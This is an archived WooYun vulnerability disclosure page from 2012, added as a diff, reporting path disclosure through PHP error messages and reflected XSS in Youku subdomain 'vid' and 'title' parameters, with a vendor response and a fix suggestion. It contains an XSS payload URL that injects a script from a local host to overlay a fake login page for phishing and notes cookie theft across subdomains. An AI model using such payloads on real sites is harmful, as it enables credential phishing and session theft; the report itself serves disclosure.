@@ -1,0 +1,224 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		优酷配置不当导致路径泄漏  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		优酷配置不当导致路径泄漏  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Ambulong">Ambulong</a> 
+</li><li>提交时间：		2012-02-07 01:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-02-07：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-02-07：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-02-17：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-02-27：	细节向普通白帽子公开<br/>
+									2012-03-08：	细节向实习白帽子公开<br/>
+									2012-03-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">优酷两处配置不当导致路径泄漏和XSS</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">优酷两处配置不当导致路径泄漏和多处XSS（至少20处）<br />
+<br />
+XSS主要是由于vid参数未处理，有很多网页都用vid参数调用视频链接。<br />
+<br />
+别小看XSS<br />
+<br />
+配置不当：<br />
+<br />
+    http://realplayer.youku.com/list.php?cls=104<br />
+<br />
+    http://realplayer.youku.com/detail.php?id=error<br />
+<br />
+</p><pre><code>Warning: Invalid argument supplied for foreach() in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 34<br />
+Warning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 59<br />
+...</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>Warning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12<br />
+Warning: simplexml_load_file(http://api.youku.com/api_ptvideoinfo?pid=XMTI3Ng==&amp;id=error) [function.simplexml-load-file]: failed to open stream: Connection timed out in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+XSS：都为vid参数或title参数存在XSS<br />
+<br />
+    http://sww.youku.com/player.php?pv=&amp;tag=whhgx&amp;vid=XMTgwMzc5Njg4&amp;title=%E4%BA%8E%E9%9B%AA%E8%96%87<br />
+<br />
+    http://minisite.youku.com/audi-ade/play.php?type=tt&amp;vid=XMjgwMDk1MjEy<br />
+<br />
+    ...<br />
+<br />
+优酷的COOKIE的DOMAIN为.youku,com，因此可在分站直接获取主站的COOKIE，还可用于跳转与钓鱼<br />
+<br />
+<br />
+<br />
+钓鱼：<br />
+<br />
+    http://minisite.youku.com/audi-ade/play.php?type=tt&amp;vid=XMjgwMDk1MjEy%3C/script%3E%3Cscript%20src=http://127.0.0.1/webpage.js%20type=text/javascript%3Ediaoyu();/*<br />
+<br />
+由函数diaoyu()调取伪造的登录界面并覆盖整个原先的界面（CSS设置下就可以） </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">    http://realplayer.youku.com/list.php?cls=104#路径<br />
+<br />
+    http://realplayer.youku.com/detail.php?id=error#路径<br />
+<br />
+    http://sww.youku.com/player.php?pv=&amp;tag=whhgx&amp;vid=XMTgwMzc5Njg4&amp;title=%E4%BA%8E%E9%9B%AA%E8%96%87#XSS<br />
+<br />
+     http://minisite.youku.com/audi-ade/play.php?vid=XMjgwMDk1MjEy&amp;type=tt#XSS<br />
+<br />
+</p><pre><code>Warning: Invalid argument supplied for foreach() in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 34<br />
+Warning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/list.php on line 59<br />
+...</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>Warning: simplexml_load_file() [function.simplexml-load-file]: php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12<br />
+Warning: simplexml_load_file(http://api.youku.com/api_ptvideoinfo?pid=XMTI3Ng==&amp;id=error) [function.simplexml-load-file]: failed to open stream: Connection timed out in /real/WebSite/htdocs/guide.cn.real.com/newsite/youku/detail.php on line 12</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/07011828150d7148b738d56f75788d0ace7423e9.png" target="_blank"><img src="../images/07011828150d7148b738d56f75788d0ace7423e9.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0701192034623df95c5fc10d8932ae07f5cb6917.png" target="_blank"><img src="../images/0701192034623df95c5fc10d8932ae07f5cb6917.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+钓鱼：<br />
+<br />
+</p><p class="detail"><a href="../images/0701194711184f3e87fe602d4c2fa2fae56e99e9.png" target="_blank"><img src="../images/0701194711184f3e87fe602d4c2fa2fae56e99e9.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">更改配置或代码，对相关参数进行处理 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Ambulong" title="Ambulong">Ambulong</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-04283" title="优酷配置不当导致路径泄漏">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2012-02-07 08:53</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经在处理中</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="4283";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
